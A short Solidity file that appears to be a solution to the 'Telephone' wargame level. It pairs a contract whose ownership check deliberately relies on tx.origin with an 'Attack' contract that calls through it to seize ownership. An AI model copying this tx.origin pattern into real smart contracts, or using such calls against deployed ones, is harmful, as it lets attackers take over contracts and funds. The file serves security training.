// SPDX-License-Identifier: MIT
pragma solidity >=0.4.25 <0.9.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Attack {
  function attack(Telephone phone) public {
      phone.changeOwner(tx.origin);
  }
}
